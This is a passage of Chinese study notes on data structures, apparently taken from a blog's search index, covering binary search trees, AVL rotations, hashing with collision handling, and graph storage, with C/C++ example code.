class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">        T-&gt;data=e;</span><br><span class="line">        T-&gt;lch=T-&gt;rch=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(e.key&lt;T-&gt;data.key)&#123;</span><br><span class="line">        <span class="built_in">InsertBST_D</span>(e, T-&gt;lch);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(e.key&gt;T-&gt;data.key)&#123;</span><br><span class="line">        <span class="built_in">InsertBST_D</span>(e, T-&gt;rch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    BiTree T=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">    T-&gt;data.key=<span class="number">45</span>;</span><br><span class="line">    T-&gt;lch=<span class="built_in">createNode</span>(<span class="number">12</span>);</span><br><span class="line">    T-&gt;lch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">3</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">37</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">24</span>);</span><br><span class="line">    T-&gt;rch=<span class="built_in">createNode</span>(<span class="number">53</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">100</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">61</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">90</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">78</span>);</span><br><span class="line">    <span class="comment">//创建了如图的二叉排序树</span></span><br><span class="line">    TElemType e;</span><br><span class="line">    e.key=<span class="number">23</span>;</span><br><span class="line">    <span class="built_in">InsertBST</span>(T, e);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">SearchBST</span>(T, <span class="number">23</span>)-&gt;data.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>算法分析</p><p>1.二叉排序树的插入算法时间复杂度与查找算法的时间复杂性相同</p><p>2.最好情况是$O(log_2{n})$;最坏情况是$O(n)$;平均情况是$O(log_2{n})$</p><p>生成一个二叉排序树的方法就是从空树开始循环调用插入算法</p><h5 id="二叉排序树的结点删除"><a href="#二叉排序树的结点删除" class="headerlink" title="二叉排序树的结点删除"></a>二叉排序树的结点删除</h5><p>定义：在二叉查找树上删除一个结点，要求删除结点后仍然保持原来二叉树的结构特点不变。</p><p>删除方法</p><p>设被删的结点为p，其双亲结点为f，则p可能有以下四种情况：</p><p>1.p为叶子结点</p><p>​    释放结点p，修改父结点f的相应结点</p><p>2.p只有左子树</p><p>​    释放结点p，p的左子树顶替p的位置</p><p>3.p只有右子树</p><p>​    释放结点p，p的右子树顶替p的结点</p><p>4.p左右子树都有</p><p>​    把左子树作为右子树中最小结点的左子树</p><p>​    或者把右子树作为左子树中最大节点的右子树</p><p>​    缺点是增加树的高度</p><p>​    改进方法：找一个结点顶替p的位置</p><p>​    这个结点满足：左子树中最大或者右子树中最小</p><h5 id="平衡二叉树的构建"><a href="#平衡二叉树的构建" class="headerlink" title="平衡二叉树的构建"></a>平衡二叉树的构建</h5><p>定义：平衡二叉树又称AVL树，一棵AVL树或者是空树，或者是具有以下性质的二叉排序树：他的所有结点的左子树和右子树的高度之差的绝对值不超过1</p><p>平衡因子的定义：任一结点的左子树的高度减去右子树的高度所得的高度差称为该结点的平衡因子BF，根据AVL树的定义，任一结点的平衡因子只能取-1，0，1。一棵平衡二叉排序树如果有n个结点，其高度可以保持在$O(\log_2n)$,平均查找长度也可以保持在$O(\log_2n)$</p><p>因为插入右子树的右子树导致不平衡，调整办法为RR旋转，实际操作是向左旋转</p><p>因为插入左子树的左子树导致不平衡，调整办法为LL旋转，实际操作是向右旋转</p><p>因为插入左子树的右子树导致不平衡，调整办法为LR旋转，实际操作是先左旋，再右旋</p><p>因为插入右子树的左子树导致不平衡，调整办法为RL旋转，实际操作是先右旋，再左旋</p><p>构造思想</p><p>在构造中，每当插入一个新结点时，首先检查是否因为插入而破坏了树的平衡性</p><p>若是，则找出其中的最小不平衡子树，在保持二叉排序树特性的前提下，调整最小不平衡子树中各结点之间的连接关系，以达到新平衡</p><p>最小不平衡子树：以离插入结点最近，平衡因子绝对值大于1的结点作为根的子树</p><p>操作实现：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">R_Rotate</span><span class="params">(BiTree &amp;p)</span></span>&#123;   <span class="comment">//LL型 右旋</span></span><br><span class="line">    BiTree lc;</span><br><span class="line">    lc=p-&gt;lch;</span><br><span class="line">    p-&gt;lch=lc-&gt;rch;</span><br><span class="line">    lc-&gt;rch=p;</span><br><span class="line">    p=lc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">L_Rotate</span><span class="params">(BiTree &amp;p)</span></span>&#123;   <span class="comment">//RR型 左旋</span></span><br><span class="line">    BiTree rc;</span><br><span class="line">    rc=p-&gt;rch;</span><br><span class="line">    p-&gt;rch=rc-&gt;lch;</span><br><span class="line">    rc-&gt;lch=p;</span><br><span class="line">    p=rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="哈希查找"><a href="#哈希查找" class="headerlink" title="哈希查找"></a>哈希查找</h3><h4 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h4><p>哈希(散列)技术：把记录(元素)的存储位置和该记录的关键字的值之间建立一种映射关系。关键字的值在这种映射下的像就是相应记录在表中的存储位置</p><p>散列技术在理想状况下查找的期望时间是$O(1)$</p><p>设U表示所有可能出现的关键字集合，K表示实际出现的关键字集合即K$\subseteq$U,F[B]是一个数组；从U到表F[B]下标集合上的一个映射h：U-&gt;{0,1,2,…,B-1}称为<strong>散列函数</strong>(哈希函数，杂凑函数)</p><p>数组F称为散列表(Hash表，杂凑表),数组中每一个单元被称为桶(bucket)</p><p>对于任意关键字k$\in$U，函数值h(k)称为k的散列地址（Hash地址，散列值，存储地址，桶号）</p><p>将结点按关键字的散列地址存储到散列表的过程称为散列</p><p>不同关键字具有相同的散列地址的现象，称为散列冲突，这两个关键字称为同义字</p><p>哈希函数的构造原则：</p><p>计算简单，散列函数不应该有很大的计算量，会降低查找效率</p><p>分布均匀：散列函数值即散列地址要尽量均匀的分布在地址空间，这样才能保证存储空间的有效利用并减少冲突</p><h4 id="哈希函数的构造方法"><a href="#哈希函数的构造方法" class="headerlink" title="哈希函数的构造方法"></a>哈希函数的构造方法</h4><h5 id="直接定址法"><a href="#直接定址法" class="headerlink" title="直接定址法"></a>直接定址法</h5><p>取关键字或关键字的某个线性函数值为哈希地址</p><p>$H(key)=a*key+b$</p><p>其中a,b为常数，又称$H(key)$为自身函数</p><p>优点：没有冲突</p><p>确定：若关键字取值跨度很大，浪费存储空间严重</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Hash</span><span class="params">(KeyType key)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> key/<span class="number">10</span><span class="number">-150</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="质数除余法"><a href="#质数除余法" class="headerlink" title="质数除余法"></a>质数除余法</h5><p>如果表长为n，取小于或等于n的最大质数m作模，关键字通过m取模运算，所得值作为散列地址</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">isPre</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(n);i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(n%i==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">FindPre</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isPre</span>(n)) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            n--;</span><br><span class="line">        &#125;<span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Hash</span><span class="params">(KeyType key,<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> key%<span class="built_in">FindPre</span>(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="处理冲突的方法"><a href="#处理冲突的方法" class="headerlink" title="处理冲突的方法"></a>处理冲突的方法</h4><h5 id="开放地址法"><a href="#开放地址法" class="headerlink" title="开放地址法"></a>开放地址法</h5><p>冲突时，在周围找一个新的空闲地址</p><p>1.线性探测再散列法：若H(key)=d的单元发生冲突，则按下列方法进行探查：</p><p>​    $h_i(k)=(h(k)+i)%n$ n是散列表长度，$1\leqslant i\leqslant n-1$</p><p>二次聚集：两个本来不冲突的非同义词，发生争夺同一个散列地址的现象称为二次聚集或堆积</p><p>开放地址法不会引起堆积现象</p><p>1利用散列函数计算出关键字为K的地址，d=H(K)如果F[d].key==K,查找成功，返回d；</p><p>2.如果F[d].key!=K，依次查找F[(d+i)%n].key,直到找到某个F[(d+j)%n].key==K，返回(d+j)%n，或者找到一个开放地址为止，或者又回到F[d]，此时则表示没找到</p><p>2.二次探测再散列法：若H(key)=d的单元发生冲突，则按照下列方法进行探查：</p><p>$h_i$(k)=(h(k)+$d_i$)%n n是散列表长度</p><p>$d_i$=$1^2$,$-1^2$,$2^2$,$-2^2$,…,$+k^2$,$-k^2$  ($k\leqslant n/2$)</p><p>$d_i$为伪随机序列，称伪随机探测再散列</p><p>3.再哈希法</p><p>设置多个哈希函数，冲突时顺序用下一个</p><h5 id="链地址法"><a href="#链地址法" class="headerlink" title="链地址法"></a>链地址法</h5><p>1.根据关键字K找到关键字为K的结点所在的单链表的手地址</p><p>2.在所找到的单链表上进行顺序查找，若找到，返回地址，否则返回空值</p><p>一个哈希查找的例子</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNSUCCESS 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DUPLICATE -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NULLKEY INT_MAX</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> hashsize[]=&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ElemType</span>&#123;</span><br><span class="line">    <span class="type">int</span> key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    ElemType *elem;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="type">int</span> sizeindex;</span><br><span class="line">&#125;HashTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isPre</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(n);i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(n%i==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">FindPre</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isPre</span>(n)) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            n--;</span><br><span class="line">        &#125;<span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Hash</span><span class="params">(KeyType key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> key%<span class="built_in">FindPre</span>(hashsize[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">collision</span><span class="params">(<span class="type">int</span> &amp;p,<span class="type">int</span> &amp;c)</span></span>&#123;</span><br><span class="line">    p=(p+c)%hashsize[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SearchHash</span><span class="params">(HashTable H,KeyType K,<span class="type">int</span> &amp;p,<span class="type">int</span> &amp;c)</span></span>&#123;</span><br><span class="line">    p=<span class="built_in">Hash</span>(K);</span><br><span class="line">    <span class="keyword">while</span>(H.elem[p].key!=NULLKEY&amp;&amp;K!=H.elem[p].key)</span><br><span class="line">        <span class="built_in">collision</span>(p,++c);</span><br><span class="line">    <span class="keyword">if</span>(K==H.elem[p].key) <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> UNSUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    HashTable HT;</span><br><span class="line">    HT.count=<span class="number">13</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> c ,p;</span><br><span class="line">    HT.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ElemType)*<span class="number">13</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">13</span>;i++)&#123;</span><br><span class="line">        HT.elem[i].key=NULLKEY;</span><br><span class="line">    &#125;</span><br><span class="line">    HT.elem[<span class="number">0</span>].key=NULLKEY;</span><br><span class="line">    HT.elem[<span class="number">1</span>].key=<span class="number">14</span>;</span><br><span class="line">    HT.elem[<span class="number">2</span>].key=<span class="number">1</span>;</span><br><span class="line">    HT.elem[<span class="number">3</span>].key=<span class="number">68</span>;</span><br><span class="line">    HT.elem[<span class="number">4</span>].key=<span class="number">27</span>;</span><br><span class="line">    HT.elem[<span class="number">5</span>].key=<span class="number">54</span>;</span><br><span class="line">    HT.elem[<span class="number">6</span>].key=<span class="number">19</span>;</span><br><span class="line">    HT.elem[<span class="number">7</span>].key=<span class="number">20</span>;</span><br><span class="line">    HT.elem[<span class="number">8</span>].key=<span class="number">84</span>;</span><br><span class="line">    HT.elem[<span class="number">9</span>].key=NULLKEY;</span><br><span class="line">    HT.elem[<span class="number">10</span>].key=<span class="number">23</span>;</span><br><span class="line">    HT.elem[<span class="number">11</span>].key=<span class="number">11</span>;</span><br><span class="line">    HT.elem[<span class="number">12</span>].key=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">13</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(HT.elem[i].key==NULLKEY)&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;@&quot;</span>&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;HT.elem[i].key&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    c=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">SearchHash</span>(HT, <span class="number">23</span>, p, c);</span><br><span class="line">    cout&lt;&lt;p&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>几种不同处理冲突方法的平均查找长度：</p><p><img src="/2023/11/21/平均查找长度比较.png" alt="平均查找长度比较"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 图</title>
      <link href="/2023/11/21/"/>
      <url>/2023/11/21/</url>
      
        <content type="html"><![CDATA[<h3 id="图的定义和术语"><a href="#图的定义和术语" class="headerlink" title="图的定义和术语"></a>图的定义和术语</h3><h4 id="图的定义"><a href="#图的定义" class="headerlink" title="图的定义"></a>图的定义</h4><p>图G由两个集合构成，记作<code>G=&lt;V,E&gt;</code> ，其中V是顶点的非空有限集合，E是边的有限集合，其中边是顶点的无序对或有序对集合。</p><h4 id="图的术语"><a href="#图的术语" class="headerlink" title="图的术语"></a>图的术语</h4><p>无向图：若图G中所有边是无向边，则G为无向图</p><p>有向图：若所有边是有向边，则G为有向图；有向边被称作弧。</p><p>无向完全图：无向图且边数为n(n-1)/2</p><p>有向完全图：有向图且边数为n(n-1)</p><p>邻接点：边的两个顶点</p><p>关联边：若边e=(v,u)，则称顶点v，u关联边e</p><p>顶点的度：一个顶点的度是与它关联的边的条数</p><p>入度：以该顶点为终点的有向边的条数，ID(v)</p><p>出度：以该顶点为起点的有向边的条数，OD(v)</p><p><strong>顶点数、边数e、和度数D(v)的关系</strong>：e=$\sum_{i=1}^nD(V_i)$/2</p><p>无向图的路径、回路：</p><p>无向图G=(V,E)中的顶点序列$v_1$,$v_2$,…,$v_k$,若($v_i$,$v_{i+1}$) $\in$ E(i=1,2,…,k-1),$v=v_1$,$u=v_k$,则称该序列是从v到u的路径；若v=u，则该序列称为回路。</p><p>有向图的路径、回路：</p><p>有向图G=(V,E)中的顶点序列$v_1$,$v_2$,…,$v_k$,若&lt;$v_i$,$v_{i+1}$&gt; $\in$ E(i=1,2,…,k-1),$v=v_1$,$u=v_k$,则称该序列是从v到u的路径；若v=u，则该序列称为回路。</p><p>简单路径：序列顶点中不重复出现的路径</p><p>简单回路/环：在一条路径中，除起点和终点外所有顶点各不相同</p><p>连通图：在无向图G=<V,E>中，若对于任何两个顶点v,u都存在v到u的路径，则称G是连通图。</V,E></p><p>强连通图：在有向图G=<V,E>中，若对于任何两个顶点v,u都存在v到u的路径，则称G是连通图。</V,E></p><p>子图：设有两个图G=(V,E)、$G_1=(V_1,E_1)$，若$V_1$ $\subseteq$V，$E_1$ $\subseteq$E，$E_1$关联的顶点都在$V_1$中，称$G_1$是G的子图。</p><p>连通分量：无向图中的极大连通子图</p><p>强连通分量：有向图中的极大强连通子图</p><p>网络(边带权图)：某些图的边具有与它相关的数，称为权，这种带权图叫网络</p><p>生成树：连通图的一个子图如果是一棵包含G所有顶点的树，则称为图G的生成树</p><p><img src="/2023/11/21/图分类.png" alt="图分类"></p><h4 id="图的抽象数据类型定义"><a href="#图的抽象数据类型定义" class="headerlink" title="图的抽象数据类型定义"></a>图的抽象数据类型定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ADT Graph&#123;</span><br><span class="line">数据对象V:V是具有相同特性的元素的集合称为顶点集。</span><br><span class="line">数据关系: R=&#123;VR&#125;</span><br><span class="line"> VR=&#123;&lt;v,w&gt;|v,w属于V且P(v,w),&lt;v,w&gt;表示从v到w的弧&#125;</span><br><span class="line">基本操作:</span><br><span class="line">  CreateGraph(&amp;G)<span class="comment">//建立图</span></span><br><span class="line">  DestoryGraph(&amp;G)<span class="comment">//销毁图</span></span><br><span class="line">  InsertVex(&amp;G,v)<span class="comment">//插入顶点</span></span><br><span class="line">  DeleteVex(&amp;G,v)<span class="comment">//删除顶点</span></span><br><span class="line">  DFSTraverse(G,v,visit())<span class="comment">//深度优先搜索</span></span><br><span class="line">  BFSTraverse(G,v,visit())  <span class="comment">//广度优先搜索</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图的存储结构"><a href="#图的存储结构" class="headerlink" title="图的存储结构"></a>图的存储结构</h3><h4 id="数组表示法-邻接矩阵"><a href="#数组表示法-邻接矩阵" class="headerlink" title="数组表示法(邻接矩阵)"></a>数组表示法(邻接矩阵)</h4><p>G的邻接矩阵满足以下条件：</p><script type="math/tex; mode=display">A[i][j]=\begin{cases}1 ,若(v_i,v_j)\in E或<v_i,v_j>\in E\\0 ,否则\end{cases}</script><p>​    邻接矩阵中的元素A[i] [j]存放的是顶点i到顶点j的关系的信息。</p><h5 id="对于无向图"><a href="#对于无向图" class="headerlink" title="对于无向图"></a>对于无向图</h5><p>无向图的邻接矩阵特点：1.对称矩阵 2.对角线元素全0</p><p>无向图的第i个顶点的度怎么表示？ 第i行(或第i列)的非零元素个数之和</p><p>图的总度数：矩阵中非零元素个数之和</p><p>边数为总度数的一半。</p><h5 id="对于有向图"><a href="#对于有向图" class="headerlink" title="对于有向图"></a>对于有向图</h5><p>第i个顶点的出度和入度如何体现？</p><p>第i行的非零元个数之和为出度</p><p>第i列的非零元个数之和为入度</p><p>边数为非零元的个数</p><h5 id="网络的邻接矩阵"><a href="#网络的邻接矩阵" class="headerlink" title="网络的邻接矩阵"></a>网络的邻接矩阵</h5><script type="math/tex; mode=display">A[i][j]=\begin{cases}Wij ,若(v_i,v_j)\in E或<v_i,v_j>\in E\\\infty ,否则\end{cases}</script><p>对于无穷大，可以用INT_MAX表示(用一个特殊的数表示即可)</p><p>存储结构：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IFINITY INT_MAX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FALSE 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;DG,DN,UDG,UDN&#125;GraphKind;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">VertexType</span>&#123;</span><br><span class="line">    <span class="type">char</span> id;</span><br><span class="line">  <span class="comment">//  string label;</span></span><br><span class="line">&#125;VRType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">InfoType</span> &#123;</span><br><span class="line">    <span class="type">int</span> weight; <span class="comment">// 用于存储边的权重</span></span><br><span class="line">&#125; InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ArcCell</span>&#123;</span><br><span class="line">    <span class="type">int</span> adj;</span><br><span class="line">    InfoType *info;</span><br><span class="line">&#125;ArcCell,AdjMatrix[MAX_VERTEX_NUM][MAX_VERTEX_NUM];</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    VertexType vexs[MAX_VERTEX_NUM];<span class="comment">//顶点信息</span></span><br><span class="line">    AdjMatrix arcs;<span class="comment">//邻接矩阵</span></span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;<span class="comment">//顶点数，边数</span></span><br><span class="line">    GraphKind kind;<span class="comment">//图种</span></span><br><span class="line">    </span><br><span class="line">&#125;MGraph;</span><br></pre></td></tr></table></figure><p>创建图：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Creategraph</span><span class="params">(MGraph &amp;G)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;<span class="type">float</span> w;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;请输入顶点数，弧数，图类型:&quot;</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d,%d&quot;</span>,&amp;G.vexnum,&amp;G.arcnum,&amp;G.kind);</span><br><span class="line">    <span class="comment">//构造顶点向量</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;输入顶点名称:&quot;</span>;</span><br><span class="line">        cin&gt;&gt;G.vexs[i].id;</span><br><span class="line">       <span class="comment">// scanf(&quot;%d&quot;,&amp;G.vexs[i].id);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化邻接矩阵</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">            G.arcs[i][j].adj=IFINITY;</span><br><span class="line">            G.arcs[i][j].info=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造邻接矩阵</span></span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;G.arcnum;k++)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;输入邻接矩阵位置与权重:&quot;</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d,%f&quot;</span>,&amp;i,&amp;j,&amp;w);</span><br><span class="line">        G.arcs[i][j].adj=w;</span><br><span class="line">        G.arcs[j][i].adj=w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><p>1.空间复杂度O($n^2$)</p><p>2.边或弧的插入和删除操作简单，但顶点的插入和删除操作不容易</p><h4 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h4><p>对于每个顶点，建立一个单链表，存储该顶点的所有邻接顶点和信息·。</p><h5 id="对于无向图-1"><a href="#对于无向图-1" class="headerlink" title="对于无向图"></a>对于无向图</h5><p>第i个顶点的总度数为边链表的结点的个数</p><p>图的总度数为所有边链表的结点个数之和。</p><p>边数即所有边链表的结点个数之和的<strong>一半</strong></p><h5 id="邻接表的定义"><a href="#邻接表的定义" class="headerlink" title="邻接表的定义"></a>邻接表的定义</h5><p>邻接表分为两部分，边链表和顶点表</p><p>存储结构：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 20</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;DG,DN,UDG,UDN&#125;GraphKind;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">InfoType</span> &#123;</span><br><span class="line">    <span class="type">int</span> weight;</span><br><span class="line">&#125;InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">vertextype</span>&#123;</span><br><span class="line">    <span class="type">char</span> id;</span><br><span class="line"> <span class="comment">//   string label;</span></span><br><span class="line">&#125;vertextype;</span><br><span class="line"><span class="comment">//边表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ArcNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> adjvex; <span class="comment">//该弧指向的顶点位置</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ArcNode</span> *nextarc;</span><br><span class="line">    InfoType *info;</span><br><span class="line">&#125;ArcNode;</span><br><span class="line"><span class="comment">//顶点表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">vnode</span>&#123;</span><br><span class="line">    vertextype data;</span><br><span class="line">    ArcNode *firstarc;</span><br><span class="line">&#125;vnode,adjlist[MAX_VERTEX_NUM];</span><br><span class="line"><span class="comment">//邻接表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    adjlist vertices;</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">    GraphKind kind;</span><br><span class="line">&#125;ALGraph;</span><br></pre></td></tr></table></figure><p>创建图：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Creatadilist</span><span class="params">(ALGraph &amp;G)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> 